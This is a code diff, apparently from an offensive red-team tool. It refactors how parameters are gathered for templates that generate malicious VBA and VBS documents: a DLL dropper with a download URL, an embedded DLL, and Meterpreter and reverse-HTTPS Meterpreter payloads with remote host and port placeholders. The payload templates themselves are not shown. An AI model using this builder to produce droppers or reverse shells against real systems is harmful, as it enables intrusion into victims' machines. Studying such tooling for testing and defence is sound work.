@@ -11,6 +11,7 @@ import vbLib.WebMeter
 import vbLib.templates
 from common import  utils
 from common.utils import MSTypes
+from collections import OrderedDict
 
 
 
@@ -62,21 +63,10 @@ class TemplateToVba(MpModule):
     
     
     def _processDropperDllTemplate(self):
-        # open file containing template values       
-        cmdFile = self.getCMDFile()
-        if cmdFile is None or cmdFile == "":
-            logging.error("   [!] Could not find template parameters! \n       Required input: \"<DLL_URL>\" \"<DLL_FCT>\"")
-            return
-        f = open(cmdFile, 'r')
-        valuesFileContent = f.read()
-        f.close()
-        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
-        dllUrl = params[0]
-        if len(params)>1:
-            dllFct = params[1]
-        else:   
-            logging.warn("   [!] No input value was provided for this function.\n       Will call 'main' function in DLL .\n       Use \"-t help\" option for help on templates.")
-            dllFct = "main"       
+        paramDict = OrderedDict([("URL", None),("Dll_Function",None)])      
+        self.fillInputParams(paramDict)  
+        dllUrl=paramDict["URL"] 
+        dllFct=paramDict["Dll_Function"]   
 
         if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT]:
             # for VBS based file
@@ -113,35 +103,26 @@ class TemplateToVba(MpModule):
             vbaFile = self.addVBAModule(content)
             logging.info("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
 
-        os.remove(cmdFile)
         logging.info("   [-] OK!")
     
     
     def _processEmbedDllTemplate(self):
         # open file containing template values       
-        cmdFile = self.getCMDFile()
-        if os.path.isfile(cmdFile):
-            f = open(cmdFile, 'r')
-            valuesFileContent = f.read()
-            f.close()
-            params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
-            dllFct = params[0] 
-        else:
-            logging.warn("   [!] No input value was provided for this template.\n       Will call 'main' function in DLL .\n       Use \"-t help\" option for help on templates.")
-            dllFct = "main"
+        paramDict = OrderedDict([("Dll_Function",None)])      
+        self.fillInputParams(paramDict)
             
         #logging.info("   [-] Dll will be dropped at: %s" % extractedFilePath)
         if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT]:
             # for VBS based file
             content = vbLib.templates.EMBED_DLL_VBS
-            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
+            content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
             vbaFile = self.addVBAModule(content)
             logging.info("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
         else:
             # for VBA based files
             # generate main module 
             content = vbLib.templates.DROPPER_DLL2
-            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
+            content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
             invokerModule = self.addVBAModule(content)
             logging.info("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
             
@@ -164,27 +145,17 @@ class TemplateToVba(MpModule):
             vbaFile = self.addVBAModule(content)
             logging.info("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
             
-        if os.path.isfile(cmdFile):
-            os.remove(cmdFile)
         logging.info("   [-] OK!")
     
     
     def _processMeterpreterTemplate(self):
         """ Generate meterpreter template for VBA and VBS based """
-        # open file containing template values       
-        cmdFile = self.getCMDFile()
-        if cmdFile is None or cmdFile == "":
-            logging.error("   [!] Could not find template parameters!")
-            return
-        f = open(cmdFile, 'r')
-        valuesFileContent = f.read()
-        f.close()
-        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
-        rhost = params[0]
-        rport = params[1] 
+        paramDict = OrderedDict([("rhost",None), ("rport",None) ])      
+        self.fillInputParams(paramDict)
+         
         content = vbLib.templates.METERPRETER
-        content = content.replace("<<<RHOST>>>", rhost)
-        content = content.replace("<<<RPORT>>>", rport)
+        content = content.replace("<<<RHOST>>>", paramDict["rhost"])
+        content = content.replace("<<<RPORT>>>", paramDict["rport"])
         if self.outputFileType in [MSTypes.HTA, MSTypes.VBS, MSTypes.SCT]:
             content = content + vbLib.Meterpreter.VBS
         else:
@@ -194,23 +165,15 @@ class TemplateToVba(MpModule):
         
  
     def _processWebMeterTemplate(self):
-        """ Generate reverse https meterpreter template for VBA and VBS based  
-        
+        """ 
+        Generate reverse https meterpreter template for VBA and VBS based  
         """
-        # open file containing template values       
-        cmdFile = self.getCMDFile()
-        if cmdFile is None or cmdFile == "":
-            logging.error("   [!] Could not find template parameters!")
-            return
-        f = open(cmdFile, 'r')
-        valuesFileContent = f.read()
-        f.close()
-        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
-        rhost = params[0]
-        rport = params[1] 
+        paramDict = OrderedDict([("rhost",None), ("rport",None) ])
+        self.fillInputParams(paramDict)
+
         content = vbLib.templates.WEBMETER
-        content = content.replace("<<<RHOST>>>", rhost)
-        content = content.replace("<<<RPORT>>>", rport)
+        content = content.replace("<<<RHOST>>>", paramDict["rhost"])
+        content = content.replace("<<<RPORT>>>", paramDict["rport"])
         content = content + vbLib.WebMeter.VBA
 
         vbaFile = self.addVBAModule(content)
